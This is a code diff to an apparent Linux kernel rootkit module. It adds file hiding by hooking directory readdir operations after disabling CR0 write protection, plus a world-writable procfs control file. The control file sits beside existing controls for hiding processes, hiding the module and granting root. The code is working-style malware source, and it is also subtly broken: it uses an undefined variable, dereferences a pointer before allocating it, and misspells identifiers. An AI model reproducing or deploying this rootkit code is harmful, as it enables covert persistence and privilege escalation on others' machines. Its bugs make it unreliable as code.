@@ -32,6 +32,16 @@ struct file_entry{
 
 };
 
+struct hooked_dir{
+	char* name;
+	int (*readdir)(struct file*, void*, filldir_t);
+	struct file_operations* fops;
+
+	struct list_head hidden_files_list;
+	struct list_head list;
+
+};
+
 static int module_hidden;
 static char* hide = "hide";
 static char* show = "show";
@@ -45,10 +55,32 @@ static int (*procfs_readdir_proc)(struct file*, void*, filldir_t);
 static filldir_t kernel_filldir=NULL;
 
 static char internal_buffer[INTERNAL_BUFFER_LEN];
-static char pid[INTERNAL_BUFFER_LEN], command[INTERNAL_BUFFER_LEN];
+static char mydir[INTERNAL_BUFFER_LEN], myfile[INTERNAL_BUFFER_LEN];
+
+static char param[INTERNAL_BUFFER_LEN], command[INTERNAL_BUFFER_LEN];
 
 static struct list_head *module_prev=NULL, *module_kobj_prev ;
 static struct kobject* module_kobj_parent=NULL;
+
+
+LIST_HEAD(hidden_pid_list);
+LIST_HEAD(hooked_dir_list);
+
+static char* strdup(const char* str){
+	char * tmp;
+	tmp = kmalloc(count+1, GFP_KERNEL);
+	strcpy(tmp, str);
+	return tmp;
+}
+
+static inline void disable_wp(void){
+	write_cr0(read_cr0() & (~ CR0_PAGE_WP));
+}
+
+static inline void enable_wp(void){
+	write_cr0(read_cr0() | CR0_PAGE_WP);
+
+}
 
 
 static  struct file_entry* create_file_entry(char *name,struct list_head* head){
@@ -62,7 +94,7 @@ static  struct file_entry* create_file_entry(char *name,struct list_head* head){
 		return NULL;
 	}
 
-	tmp->name = kmalloc(strlen(name), GFP_KERNEL);
+	tmp->name = strdup(name);
 
 	if( tmp->name == NULL){
 		kfree(tmp);
@@ -70,7 +102,6 @@ static  struct file_entry* create_file_entry(char *name,struct list_head* head){
 		return NULL;
 	}
 
-	strcpy(tmp->name, name);
 	list_add( &tmp->list, head);
 
 	return tmp;
@@ -93,16 +124,82 @@ static struct file_entry*  find_file_entry(const char *name, struct list_head* h
 
 }
 
-LIST_HEAD(hidden_pid_list);
+static  struct hooked_dir* create_hooked_dir_entry(char *name,struct list_head* head){
 
-static inline void disable_wp(void){
-	write_cr0(read_cr0() & (~ CR0_PAGE_WP));
+	struct hooked_dir* tmp=NULL;
+	struct file* fp;
+
+	fp = filp_open(name, O_RDONLY, 0);
+
+	if(fp == NULL){
+		printk(KERN_IFNO"%s: failed opening file", MODULE_NAME);
+		return NULL;
+	}
+
+	tmp->fops = fp -> f_op;
+	tmp->readdir = tmp->fops->readdir;
+
+	disable_wp();
+	tmp->fops->readdir = file_hider;
+	enable_wp();	
+
+	filp_close(fp);
+
+	tmp = kmalloc(sizeof(struct hooked_dir), GFP_KERNEL);	
+
+	if(tmp == NULL){
+		printk(KERN_INFO"%s: out of memory", MODULE_NAME);
+		return NULL;
+	}
+
+	tmp->name = strdup(name);
+
+	if( tmp->name == NULL){
+		kfree(tmp);
+		printk (KERN_INFO"%s: out of memory", MODULE_NAME);
+		return NULL;
+	}
+
+	INIT_LIST_HEAD(&tmp->hidden_files_list);
+	list_add( &tmp->list, head);
+
+	return tmp;
 }
 
-static inline void enable_wp(void){
-	write_cr0(read_cr0() | CR0_PAGE_WP);
+static void delete_hooked_dir_entry(struct hooked_dir* entry){
+	list_del(&entry->list);
+	struct list_head* tmp;
+	struct file_entry* f_entry;
+	
+	while(!list_empty(&entry->hidden_files_list)){
+		tmp = entry->hidden_files_list.prev;		
+		f_entry = list_entry(tmp , struct file_entry, list);
+		delete_file_entry(tmp);
+	}	
+		
+	disable_wp();
+	entry->fops->readdir=entry->readdir;
+	enable_wp();
+
+	kfree(entry->name);
+	kfree(entry);
+}
+
+static struct hooked_dir* find_hooked_dir_entry(const char*name, struct list_head* head){
+
+	struct hooked_dir* i;
+	list_for_each_entry(i, head,list){
+		if(!strcmp(name, i->name)){
+			return i;
+		}
+	}
+
+	return NULL;
+
 
 }
+
+
 
 static int proc_filldir_hider(void* buf, const char *name, int namelen, loff_t offset, u64 ino , unsigned d_type){
 	
@@ -137,34 +234,122 @@ static int control_write(struct file* file, const char __user * buf, unsigned lo
 }
 */
 
-static int pid_hide_write(struct file* file, const char __user * buf, unsigned long count, void *data ){
+static int hide_file_read(char *buffer, char **buffer_location, off_t off, int count, int *eof , void *data){
+	
+		
+	return count;
+}
 
+static void hide_file(const char*dir, const char *name){
+	hooked_dir* hd=NULL;
+	file_entry* fe;
+	hd = find_hooked_dir_entry(dir,hooked_dir_list);
 
-	int items=0;
-	struct file_entry* tmp=NULL;
+	if(hd == NULL){
+		hd = create_hooked_dir_entry(name,hooked_dir_list);
+		if ( hd == NULL){
+			return;
+		}
+	}
+	fe = find_file_entry(name, hd->hidden_files_list);
 
-	strncpy(internal_buffer, buf, min((count+1),(unsigned long) INTERNAL_BUFFER_LEN));
-	internal_buffer[min(count,(unsigned long ) INTERNAL_BUFFER_LEN)]=0;
+	if(fe == NULL){
+		fe = create_file_entry(name, hd->hidden_files_list);
+		if(fe == NULL && list_empty(hd->hidden_files_list)){
+			delete_hooked_dir_entry(hd);
+		}
+	}
 
-	items = sscanf(internal_buffer, "%s %s", command, pid);
+}
 
-	if(items < 2){
+static void show_file(const char* dir, const char *name){
+
+	hooked_dir* hd=NULL;
+	file_entry* fe;
+	hd = find_hooked_dir_entry(dir,hooked_dir_list);
+
+	if(hd == NULL){
+			return;
+	}
+
+	fe = find_file_entry(name, hd->hidden_files_list);
+
+	if(fe != NULL){
+		delete_file_entry(name);
+
+		if(list_empty(hd->hidden_files_list)){
+			delete_hooked_dir_entry(hd);
+		}
+
+	}
+
+}
+
+static int get_filendir(char *str, char* dirname, char *filename){
+	int i ; 
+
+	for(i = strlen(str); i>=0; i--){
+		if(str[i]=='/'){
+			str[i]=' ';
+			break;
+		}
+
+	}
+	return sscanf(str,"%s %s", dirname, filename) == 2 ; 
+}
+
+static int hide_file_write(struct file* file, const char __user * buf, unsigned long count, void *data ){
+	struct file_entry *fe;
+	struct hooked_dir *hd;	
+
+	if(!get_command(buf,internal_buffer, command,param,count)){
 		return count;
 	}
-	//since we have granted that the strings are null terminated by internat_buffer[stuff]=0 && sscanf
-	//there's no need for strncmp i believe
+
+	if(!get_filendir(param,mydir, myfile)){
+		return count;
+	}	
+
+	if(!strcmp(command,hide)){
+		hide_file(mydir,myfile);		
+	}
+
+	if(!strcmp(command,show)){
+		show_file(mydir,myfile);
+	}
+
+	return count;
+
+}
+
+static int get_command(const char* input,char* cpybuf, char* cmd1, char* cmd2, unsigned long len){
+
+
+	strncpy(cpybuf, input, min((len+1),(unsigned long) INTERNAL_BUFFER_LEN));
+	cpybuf[min(len,(unsigned long ) INTERNAL_BUFFER_LEN)]=0;
+	return sscanf(cpybuf, "%s %s", command, param) == 2;
+}
+
+
+static int pid_hide_write(struct file* file, const char __user * buf, unsigned long count, void *data ){
+
+	struct file_entry* tmp=NULL;
+
+	if(!get_command(buf,internat_buffer, command,param,count)){
+		return count;
+	}
 	
 	if(!strcmp(command,hide)){
 
-		if(find_file_entry(pid, &hidden_pid_list) == NULL){
-			tmp = create_file_entry(pid,&hidden_pid_list);
+		if(find_file_entry(param, &hidden_pid_list) == NULL){
+			tmp = create_file_entry(param,&hidden_pid_list);
 		}
 
 	}
 
 	if(!strcmp(command,show)){
 
-		tmp = find_file_entry(pid, &hidden_pid_list);
+		tmp = find_file_entry(param, &hidden_pid_list);
 
 		if(tmp!=NULL){
 			delete_file_entry(tmp);
@@ -288,7 +473,7 @@ static int control_init(void){
 	create_procfs_entry(HIDE_PID_FILE,0666,proc_control,pid_hide_write,pid_hide_read);
 	create_procfs_entry(GIVE_ROOT_FILE, 0666,proc_control,give_root_write,NULL);
 	create_procfs_entry(HIDE_MODULE_FILE, 0666, proc_control, module_hide_write, module_hide_read);
-
+	create_procfs_entry(HIDE_FILE_FILE, 0666,proc_control, hide_file_write, hide_file_read);
 	return 1; 
 }
 
